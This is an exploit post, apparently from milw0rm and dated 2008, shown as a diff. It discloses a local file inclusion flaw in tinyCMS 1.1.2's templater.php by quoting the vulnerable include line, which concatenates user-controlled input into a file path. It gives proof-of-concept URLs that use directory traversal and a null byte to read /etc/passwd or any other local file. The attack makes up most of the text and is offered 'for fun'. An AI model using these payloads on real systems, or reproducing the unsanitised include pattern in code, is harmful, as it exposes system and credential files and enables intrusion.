@@ -1,0 +1,30 @@
+﻿########################################################################################
+#
+#   Name        :   tinyCMS 1.1.2 (templater.php) Local File Inclusion Vulnerability
+#   Author      :   cOndemned [ Dark-Coders ]
+#   Greetz      :   Avantura, str0ke, ZaBeaTy, doctor, voo|doo, sid.psycho, irk4z
+#   Conditions  :   Magic quotes gpc = Off / Register Globals = On
+#   Other info  :   Prior versions probably are vulnerable too
+#
+########################################################################################
+
+Source of /modules/ZZ_Templater/templater.php
+
+    [ ... ]
+    
+    17.     $ftemplatedir = 'templates/'.$config['template'].'/';
+    18.     include('templates/'.$config['template'].'/data.php');      // <--- LFI
+    19.     if($tdata['useblocks'] == 1)
+    
+    [ ... ]
+    
+
+Proof of Concept :
+
+    http://[host]/[tinyCMS]/modules/ZZ_Templater/templater.php?config[template]=../../../../etc/passwd%00
+    http://[host]/[tinyCMS]/modules/ZZ_Templater/templater.php?config[template]=../../../../[local_file]%00
+    
+
+Jusf 4 fun    
+
+# milw0rm.com [2008-08-21]
